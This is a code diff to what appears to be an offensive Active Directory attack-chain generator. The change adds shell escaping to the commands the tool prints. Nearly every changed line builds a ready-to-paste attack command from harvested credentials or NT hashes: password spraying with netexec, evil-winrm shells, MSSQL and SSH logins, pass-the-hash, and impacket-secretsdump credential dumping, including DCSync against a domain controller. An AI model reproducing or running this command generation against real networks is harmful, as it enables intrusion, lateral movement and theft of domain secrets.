@@ -284,6 +284,8 @@ def run(report, store, ui=None):
     for pw, users_occs in by_pw.items():
         known_users = {u for u, _ in users_occs if u}
         aggregate = len(known_users) >= 2
+        # iter-128: shell-escape pw for command emission; summary keeps raw.
+        _pw_sh = _sh_sq(pw)
         if aggregate:
             # pick the earliest / most-informative anchor across all users
             all_occs = [(u, o) for u, occs in users_occs for o in occs]
@@ -303,7 +305,7 @@ def run(report, store, ui=None):
                                 f"do NOT spray more attempts than {lockout - 1} per user")
             chains.append(Chain("R1", "spray", summary,
                 crit=8, conf=0.85, ready=1.5, prox=_prox(store, smb),
-                commands=[f"netexec smb {smb} -u {utoken} -p '{pw}' "
+                commands=[f"netexec smb {smb} -u {utoken} -p '{_pw_sh}' "
                           f"--continue-on-success{lockout_note}"],
                 src=src, line=ln, count=len(known_users)))
             continue
@@ -337,7 +339,10 @@ def run(report, store, ui=None):
             # iter-110: whole-URI single-quoting for parity with R7 / R-*
             # chains. 'user:pw@target' as one unit; special chars in pw stay
             # literal.
-            _r1_uri = f"'{disp}:{pw}@{smb}'"
+            # iter-128: escape ' inside pw / disp so a paste survives bash
+            # lexing (GPP / notes creds routinely carry apostrophes).
+            _disp_sh = _sh_sq(disp)
+            _r1_uri = f"'{_disp_sh}:{_pw_sh}@{smb}'"
             if _r1_tgt_dc:
                 _r1_dump = f"impacket-secretsdump {_r1_uri} -just-dc"
                 _r1_dump_note = (f"# AFTER confirming Pwn3d! on {smb}, then dcsync "
@@ -348,7 +353,7 @@ def run(report, store, ui=None):
                                  f"SAM + LSA cached secrets (target isn't the DC):")
             chains.append(Chain("R1", "spray", f"reuse {disp}:{pw} across hosts",
                 crit=8, conf=0.8, ready=1.5, prox=_r1_prox,
-                commands=[f"netexec smb {smb} -u {utoken} -p '{pw}' --continue-on-success{krb_flag}{lockout_note}",
+                commands=[f"netexec smb {smb} -u {utoken} -p '{_pw_sh}' --continue-on-success{krb_flag}{lockout_note}",
                           _r1_dump_note,
                           _r1_dump],
                 src=src, line=ln))
@@ -356,21 +361,21 @@ def run(report, store, ui=None):
             if wh:
                 chains.append(Chain("R3", "winrm shell", f"{disp} -> WinRM {wh}",
                     crit=7, conf=0.8, ready=1.5, prox=_prox(store, wh),
-                    commands=[f"evil-winrm -i {wh} -u '{disp}' -p '{pw}'"], src=src, line=ln))
+                    commands=[f"evil-winrm -i {wh} -u '{_disp_sh}' -p '{_pw_sh}'"], src=src, line=ln))
             mh = svc_on(mach, "mssql")
             if mh:
                 # iter-111: whole-URI quoting parity with iter-110 (R1) and
                 # iter-109 (R7) - one 'user:pw@target' single-quoted unit.
                 chains.append(Chain("R4", "mssql", f"{disp} -> MSSQL {mh}",
                     crit=6, conf=0.7, ready=1.5, prox=_prox(store, mh),
-                    commands=[f"impacket-mssqlclient '{disp}:{pw}@{mh}' -windows-auth"], src=src, line=ln))
+                    commands=[f"impacket-mssqlclient '{_disp_sh}:{_pw_sh}@{mh}' -windows-auth"], src=src, line=ln))
             sh = svc_on(mach, "ssh")
             if sh:
                 # iter-13: SSH password login is more reliable than MSSQL
                 # -windows-auth (which depends on a successful AD mapping).
                 chains.append(Chain("R5", "ssh", f"{disp} -> SSH {sh}",
                     crit=6, conf=0.75, ready=1.5, prox=_prox(store, sh),
-                    commands=[f"ssh '{disp}'@{sh}    # password: {pw}"], src=src, line=ln))
+                    commands=[f"ssh '{_disp_sh}'@{sh}    # password: {pw}"], src=src, line=ln))
 
     # ── NT hashes: AGGREGATE per target (one rolled-up PtH chain, not 1/hash) ──
     # iter-13 false-confidence fix: tag hash origin (local-SAM vs domain) so
@@ -426,14 +431,16 @@ def run(report, store, ui=None):
         # PtH against the DC is the wrong move; PtH against the originating
         # host with --local-auth is the right one. Emit two distinct chains.
         local_origin = any(_hash_is_local_sam(s) for _h, _u, s, _l in items)
+        # iter-128: shell-safe user + domain for R7 emissions.
+        _u_sh = _sh_sq(u)
         if local_origin:
-            cmd_pth = (f"netexec smb {tgt} -u '{u}' -H {h0} --local-auth{more}    "
+            cmd_pth = (f"netexec smb {tgt} -u '{_u_sh}' -H {h0} --local-auth{more}    "
                        f"# LOCAL SAM hash - target the ORIGINATING host, not the DC")
         else:
-            cmd_pth = f"netexec smb {tgt} -u '{u}' -H {h0}{more}"
+            cmd_pth = f"netexec smb {tgt} -u '{_u_sh}' -H {h0}{more}"
         # iter-24: drop literal '<DOMAIN>' when we've learned a real domain
         # from BloodHound / NTDS / netexec_db; otherwise keep the placeholder.
-        _dom_r7 = store.dominant_domain() or "<dom>"
+        _dom_r7 = _sh_sq(store.dominant_domain() or "<dom>")
         # iter-76: -just-dc only works when tgt IS the DC (impacket triggers
         # DCSync via DRSUAPI, which requires target = DC replication endpoint).
         # If tgt is a non-DC domain host, the second command was previously
@@ -451,10 +458,10 @@ def run(report, store, ui=None):
                           "gather domain creds first")
         elif _tgt_is_dc:
             _r7_follow = (f"impacket-secretsdump {_r7_hf} "
-                          f"'{_dom_r7}/{u}@{tgt}' -just-dc   # if (Pwn3d!)")
+                          f"'{_dom_r7}/{_u_sh}@{tgt}' -just-dc   # if (Pwn3d!)")
         else:
             _r7_follow = (f"impacket-secretsdump {_r7_hf} "
-                          f"'{_dom_r7}/{u}@{tgt}'   "
+                          f"'{_dom_r7}/{_u_sh}@{tgt}'   "
                           f"# if (Pwn3d!) - dumps LOCAL SAM + LSA cached "
                           f"secrets; DCSync requires DC target")
         chains.append(Chain("R7", "pass-the-hash", f"PtH -> {tgt}" + (f"  x{n} hashes" if n > 1 else f" ({u})"),
